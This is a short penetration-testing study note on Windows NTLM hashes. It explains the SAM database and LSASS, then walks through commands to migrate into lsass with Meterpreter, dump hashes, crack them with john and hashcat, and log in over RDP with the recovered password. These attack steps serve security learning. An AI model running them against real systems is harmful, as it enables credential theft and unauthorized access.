---
up: "[[Dumping & Cracking Hashes]]"
---

# Windows NTLM Hashes

- Windows strores hashed user account passwords locally in the SAM database
- Authentication and verification or user credentials is facilitated by the Local Security Authority (LSA) process
- Windows utilizes different types of hashes:
	- LM
	- NTLM
- Now LM is disabled

## SAM database

- Security Account Manager, is a database file responsible for managing user accounts and passwords on Windows
- The SAM database cannot be copied while the OS is running
- Windows kernel keeps the SAM database locked so attacker tipically utilize in-memory techniques and tools to dump SAM hashes from the LSASS process
- In modern version of Windows the SAM is encrypted with a syskey
- Elevated privileges are required in order to access and interact with the LSASS process

## NTLM (NTHash)

- Collection of authentication protocols that are utilzed in Windows to facilitate authentication between computers

## Dumping & Cracking NTLM Hashes

- Dump can be done using various utilities like:
	- `hashdump`
	- `Mimikatz`
- After dumping the hashes the cracking can be done with:
	- `john`
	- `hashcat`

## Demonstration

```bash
m> getprivs
m> pgrep lsass
m> migrate <id>
m> hashdump
<hashes>
# paste hashes in hashes.txt
```

With ``john``:

```bash
john --list=formats
john --format=NT hashes.txt [--wordlist=<wordlist>]
gzip -d /usr/share/wordlists/rockyou.txt.gz
```

With ``hashcat``:

```bash
hashcat -m <hash_id>
# id 1000 for NTLM
hashcat -a3 -m 1000 hashes.txt rockyou.txt 
```

Then you can login to the target using RDP for example:

```bash
xfreerdp /u:<username> /p:<password> /v:<ip>
```
